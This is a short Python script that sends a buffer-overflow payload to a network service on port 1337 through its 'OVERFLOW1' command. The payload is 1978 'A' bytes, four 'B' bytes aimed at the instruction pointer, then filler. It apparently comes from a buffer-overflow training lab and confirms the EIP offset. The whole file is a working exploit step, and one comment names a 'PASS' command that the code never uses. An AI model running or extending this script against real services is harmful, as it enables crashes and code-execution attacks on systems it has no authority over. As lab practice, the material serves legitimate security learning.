import socket
import sys
import time


print("[+] Nani! offset\n")

buff = "A" * 1978
eip = "B" * 4
fill = "C" * 418

payload = buff + eip + fill

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Application
s.connect(('10.10.73.133', 1337))
s.recv(1024)	#Recv the banner


#Finally the vulnerable command PASS
s.send('OVERFLOW1 ' + payload + '\r\n')
s.send('EXIT\r\n')
s.close()

print("\nExecution Finished!\n")
